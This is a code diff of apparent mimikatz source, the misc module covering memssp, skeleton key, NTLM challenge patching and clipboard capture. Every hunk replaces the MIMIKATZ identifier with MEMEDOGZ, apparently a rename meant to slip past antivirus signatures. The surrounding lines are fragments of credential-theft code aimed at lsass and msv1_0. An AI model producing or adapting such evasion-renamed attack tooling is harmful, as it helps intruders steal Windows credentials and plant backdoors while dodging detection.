@@ -333,22 +333,22 @@ BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SI
 //
 //	if(argc > 1)
 //	{
-//		if((MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7) && (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8))
+//		if((MEMEDOGZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7) && (MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8))
 //		{
 //			pOs = w2k8r2;
 //			pOsSz = ARRAYSIZE(w2k8r2);
 //		}
-//		else if((MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_8) && (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE))
+//		else if((MEMEDOGZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_8) && (MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE))
 //		{
 //			pOs = w2k12;
 //			pOsSz = ARRAYSIZE(w2k12);
 //		}
-//		else if((MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_BLUE) && (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_10))
+//		else if((MEMEDOGZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_BLUE) && (MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_10))
 //		{
 //			pOs = w2k12r2;
 //			pOsSz = ARRAYSIZE(w2k12r2);
 //		}
-//		else if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10)
+//		else if(MEMEDOGZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10)
 //		{
 //			pOs = wservprev;
 //			pOsSz = ARRAYSIZE(wservprev);
@@ -537,7 +537,7 @@ NTSTATUS kuhl_m_misc_memssp(int argc, wchar_t * argv[])
 				{
 					sSearch.kull_m_memoryRange.kull_m_memoryAdress = iMSV.DllBase;
 					sSearch.kull_m_memoryRange.size = iMSV.SizeOfImage;
-					if(pGeneric = kull_m_patch_getGenericFromBuild(MSV1_0AcceptReferences, ARRAYSIZE(MSV1_0AcceptReferences), MIMIKATZ_NT_BUILD_NUMBER))
+					if(pGeneric = kull_m_patch_getGenericFromBuild(MSV1_0AcceptReferences, ARRAYSIZE(MSV1_0AcceptReferences), MEMEDOGZ_NT_BUILD_NUMBER))
 					{
 						aLocal.address = pGeneric->Search.Pattern;
 						if(kull_m_memory_search(&aLocal, pGeneric->Search.Length, &sSearch, TRUE))
@@ -671,7 +671,7 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 		{NULL,				NULL,			(PVOID) 0x4444444444444444, NULL}, // Decrypt
 	};
 	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
-	BOOL onlyRC4Stuff = (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_VISTA) || kull_m_string_args_byName(argc, argv, L"letaes", NULL, NULL);
+	BOOL onlyRC4Stuff = (MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_VISTA) || kull_m_string_args_byName(argc, argv, L"letaes", NULL, NULL);
 	RtlZeroMemory(&orig, sizeof(orig));
 	RtlInitUnicodeString(&orig, newerKey);
 	if(kull_m_process_getProcessIdForName(L"lsass.exe", &processId))
@@ -755,7 +755,7 @@ NTSTATUS kuhl_m_misc_compress(int argc, wchar_t * argv[])
 	if(kull_m_string_args_byName(argc, argv, L"input", &szInput, _wpgmptr))
 #pragma warning(pop)
 	{
-		if(kull_m_string_args_byName(argc, argv, L"output", &szOutput, MIMIKATZ L"_" MIMIKATZ_ARCH L".compressed"))
+		if(kull_m_string_args_byName(argc, argv, L"output", &szOutput, MEMEDOGZ L"_" MEMEDOGZ_ARCH L".compressed"))
 		{
 			kprintf(L"Input : %s\nOutput: %s\n\nOpening: ", szInput, szOutput);
 			if(kull_m_file_readData(szInput, (PBYTE *) &pInput, &dwInput))
@@ -1024,7 +1024,7 @@ KULL_M_PATCH_GENERIC SHNMReferences[] = {
 #endif
 NTSTATUS kuhl_m_misc_easyntlmchall(int argc, wchar_t * argv[])
 {
-	if((MIMIKATZ_NT_BUILD_NUMBER == (KULL_M_WIN_BUILD_7 + 1)) || (MIMIKATZ_NT_BUILD_NUMBER == KULL_M_WIN_BUILD_10_1709))
+	if((MEMEDOGZ_NT_BUILD_NUMBER == (KULL_M_WIN_BUILD_7 + 1)) || (MEMEDOGZ_NT_BUILD_NUMBER == KULL_M_WIN_BUILD_10_1709))
 		kull_m_patch_genericProcessOrServiceFromBuild(SHNMReferences, ARRAYSIZE(SHNMReferences), L"SamSs", L"msv1_0.dll", TRUE);
 	else PRINT_ERROR(L"Windows version is not supported (yet)\n");
 	return STATUS_SUCCESS;
@@ -1045,11 +1045,11 @@ NTSTATUS kuhl_m_misc_clip(int argc, wchar_t * argv[])
 	RtlZeroMemory(&myClass, sizeof(WNDCLASSEX));
 	myClass.cbSize = sizeof(WNDCLASSEX);
 	myClass.lpfnWndProc = kuhl_m_misc_clip_MainWndProc;
-	myClass.lpszClassName = MIMIKATZ L"_Window_Message";
+	myClass.lpszClassName = MEMEDOGZ L"_Window_Message";
 	kprintf(L"Monitoring ClipBoard...(CTRL+C to stop)\n\n");
 	if(aClass = RegisterClassEx(&myClass))
 	{
-		if(kuhl_misc_clip_hWnd = CreateWindowEx(0, (LPCWSTR) aClass, MIMIKATZ, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL))
+		if(kuhl_misc_clip_hWnd = CreateWindowEx(0, (LPCWSTR) aClass, MEMEDOGZ, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL))
 		{
 			SetConsoleCtrlHandler(kuhl_misc_clip_WinHandlerRoutine, TRUE);
 			kuhl_misc_clip_Data = NULL;
@@ -1290,7 +1290,7 @@ NTSTATUS kuhl_m_misc_aadcookie_NgcSignWithSymmetricPopKey(int argc, wchar_t * ar
 				sLabel = kull_m_string_unicode_to_ansi(szLabel);
 				if(kull_m_string_args_byName(argc, argv, L"context", &szContext, NULL))
 					kull_m_string_stringToHexBuffer(szContext, &pbContext, &cbContext);
-				kull_m_string_args_byName(argc, argv, L"signedinfo", &szData, MIMIKATZ);
+				kull_m_string_args_byName(argc, argv, L"signedinfo", &szData, MEMEDOGZ);
 				sData = kull_m_string_unicode_to_ansi(szData);
 
 				if(!pbContext)
